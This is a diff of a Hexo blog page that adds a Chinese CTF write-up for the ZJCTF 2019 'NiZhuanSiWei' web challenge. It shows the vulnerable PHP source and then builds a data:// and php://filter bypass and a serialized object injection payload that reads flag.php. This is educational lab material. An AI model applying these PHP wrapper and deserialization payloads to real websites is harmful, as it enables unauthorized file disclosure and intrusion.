@@ -100,12 +100,12 @@ youlin = Hexo</title>
       </div>
       <div id="imgs" class="pjax">
         <ul>
-          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gipeubcbajj20zk0m8h1h.jpg"></li>
-          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gipet8c1a2j20zk0m8kct.jpg"></li>
-          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gicitht3xtj20zk0m8k5v.jpg"></li>
-          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gipesrnqv3j20zk0m8ava.jpg"></li>
-          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1giclil3m4ej20zk0m8tn8.jpg"></li>
-          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gicis081o9j20zk0m8dmr.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giclx29mstj20zk0m8hdt.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giclga70tsj20zk0m84mr.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giciub8ja1j20zk0m81ky.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gipexj2jgzj20zk0m8b09.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gicit31ffoj20zk0m8naf.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gipesng5oej20zk0m87d4.jpg"></li>
         </ul>
       </div>
     </header>
@@ -193,6 +193,32 @@ youlin = Hexo</title>
 
 <p>就可以得到对应的session的内容，然后利用bp进行抓包修改session发送后就可以得到flag</p>
 <p><img data-src="C:\Users\youlin\AppData\Roaming\Typora\typora-user-images\1668847091154.png" alt="1668847091154"></p>
+<h2 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h2><p>打开题目就可以直接看到题目源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php  </span><br><span class="line">$text = $_GET[&quot;text&quot;];</span><br><span class="line">$file = $_GET[&quot;file&quot;];</span><br><span class="line">$password = $_GET[&quot;password&quot;];</span><br><span class="line">if(isset($text)&amp;&amp;(file_get_contents($text,&#x27;r&#x27;)===&quot;welcome to the zjctf&quot;))&#123;</span><br><span class="line">    echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#x27;r&#x27;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;;</span><br><span class="line">    if(preg_match(&quot;/flag/&quot;,$file))&#123;</span><br><span class="line">        echo &quot;Not now!&quot;;</span><br><span class="line">        exit(); </span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        include($file);  //useless.php</span><br><span class="line">        $password = unserialize($password);</span><br><span class="line">        echo $password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+
+<p>这道题考点：<strong>php伪协议</strong></p>
+<p><img data-src="https://img-blog.csdnimg.cn/20201115161452915.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dvNDFnZQ==,size_16,color_FFFFFF,t_70#pic_center"></p>
+<p>首先看第一个判断，text文件里面的内容等于”welcome to the zjctf”</p>
+<p>通过data协议进行绕过，一般情况是需要base64加密的，为了绕过某些过滤</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">text=data:<span class="comment">//text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>加上第二个绕过：（php://filter用于读取源码）</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">text=data:<span class="comment">//text//plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=php://filter/read=convert.base64-encode/resource=useless.php</span></span><br></pre></td></tr></table></figure>
+
+<p>进行base64解码得到：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line"></span><br><span class="line">class Flag&#123;  //flag.php  </span><br><span class="line">    public $file;  </span><br><span class="line">    public function __tostring()&#123;  </span><br><span class="line">        if(isset($this-&gt;file))&#123;  </span><br><span class="line">            echo file_get_contents($this-&gt;file); </span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">        return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">?&gt;  </span><br></pre></td></tr></table></figure>
+
+<p><strong>第三个绕过：（反序列化）</strong></p>
+<p>进行测试就可以了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">class Flag&#123;  //flag.php  </span><br><span class="line">    public $file=&quot;flag.php&quot;;  </span><br><span class="line">    public function __tostring()&#123;  </span><br><span class="line">        if(isset($this-&gt;file))&#123;  </span><br><span class="line">            echo file_get_contents($this-&gt;file); </span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">        return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">$a = new Flag();</span><br><span class="line">echo serialize($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>运行结果：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>所以最终的payload:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?text=data:<span class="comment">//text//plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>flag:flag{cda1d469-1b5b-43aa-9cf2-28d1b99c5b20}</p>
 
   </div>
 
@@ -204,7 +230,7 @@ youlin = Hexo</title>
       <i class="ic i-calendar-check"></i>
     </span>
     <span class="text">Edited on</span>
-    <time title="Modified: 2022-11-19 16:38:27" itemprop="dateModified" datetime="2022-11-19T16:38:27+08:00">2022-11-19</time>
+    <time title="Modified: 2022-11-20 00:42:19" itemprop="dateModified" datetime="2022-11-20T00:42:19+08:00">2022-11-20</time>
   </span>
 </div>
 
@@ -259,7 +285,7 @@ youlin = Hexo</title>
     <div class="item left">
       
 
-  <a href="/2022/11/06/%E7%A5%A5%E4%BA%91%E6%9D%AF%E5%A4%8D%E7%8E%B0/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva2.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1giciszlczyj20zk0m816d.jpg" title="祥云杯复现">
+  <a href="/2022/11/06/%E7%A5%A5%E4%BA%91%E6%9D%AF%E5%A4%8D%E7%8E%B0/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva1.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1giclip4jbpj20zk0m87cv.jpg" title="祥云杯复现">
   <span class="type">Previous Post</span>
   <span class="category"><i class="ic i-flag"></i> </span>
   <h3>祥云杯复现</h3>
@@ -283,7 +309,7 @@ youlin = Hexo</title>
   <div class="panels">
     <div class="inner">
       <div class="contents panel pjax" data-title="Contents">
-          <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#BJDCTF2020-Easy-MD5"><span class="toc-number">1.</span> <span class="toc-text">[BJDCTF2020]Easy MD5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HCTF-2018-admin"><span class="toc-number">2.</span> <span class="toc-text">[HCTF 2018]admin</span></a></li></ol>
+          <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#BJDCTF2020-Easy-MD5"><span class="toc-number">1.</span> <span class="toc-text">[BJDCTF2020]Easy MD5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HCTF-2018-admin"><span class="toc-number">2.</span> <span class="toc-text">[HCTF 2018]admin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ZJCTF-2019-NiZhuanSiWei"><span class="toc-number">3.</span> <span class="toc-text">[ZJCTF 2019]NiZhuanSiWei</span></a></li></ol>
       </div>
       <div class="related panel pjax" data-title="Related">
       </div>
@@ -356,7 +382,7 @@ youlin = Hexo</title>
 <div class="breadcrumb">
 </div>
 
-    <span><a href="/2022/08/01/io-file/" title="io_file">io_file</a></span>
+    <span><a href="/2022/11/06/%E7%A5%A5%E4%BA%91%E6%9D%AF%E5%A4%8D%E7%8E%B0/" title="祥云杯复现">祥云杯复现</a></span>
   </li>
 
       
@@ -373,46 +399,10 @@ youlin = Hexo</title>
   <li class="item">
     
 <div class="breadcrumb">
-</div>
-
-    <span><a href="/2022/09/04/awd_pwn%E6%80%BB%E7%BB%93/" title="awd_pwn总结">awd_pwn总结</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/2022/04/18/%E6%A0%88%E8%BF%81%E7%A7%BB/" title="栈迁移">栈迁移</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/2022/09/07/io-file%E5%88%A9%E7%94%A8/" title="io_file利用">io_file利用</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
 <a href="/categories/cometition/" title="In cometition">cometition</a>
 </div>
 
-    <span><a href="/2022/09/22/%E6%9F%8F%E9%B9%AD%E6%9D%AF/" title="柏鹭杯">柏鹭杯</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/2022/10/11/house-of-emma/" title="house_of_emma">house_of_emma</a></span>
+    <span><a href="/2022/08/21/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95/" title="巅峰极客复现">巅峰极客复现</a></span>
   </li>
 
       
@@ -422,6 +412,16 @@ youlin = Hexo</title>
 </div>
 
     <span><a href="/2022/09/21/aarch64/" title="aarch64">aarch64</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/cometition/" title="In cometition">cometition</a>
+</div>
+
+    <span><a href="/2022/03/18/picoCTF-wp/" title="picoCTF_wp">picoCTF_wp</a></span>
   </li>
 
       
@@ -439,7 +439,34 @@ youlin = Hexo</title>
 <div class="breadcrumb">
 </div>
 
-    <span><a href="/2022/08/22/house-of-banana/" title="house_of_banana">house_of_banana</a></span>
+    <span><a href="/2022/10/11/house-of-emma/" title="house_of_emma">house_of_emma</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2022/09/07/io-file%E5%88%A9%E7%94%A8/" title="io_file利用">io_file利用</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2022/04/02/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%B3%84%E9%9C%B2canary/" title="格式化字符串泄露canary">格式化字符串泄露canary</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2022/09/04/awd_pwn%E6%80%BB%E7%BB%93/" title="awd_pwn总结">awd_pwn总结</a></span>
   </li>
 
   </ul>
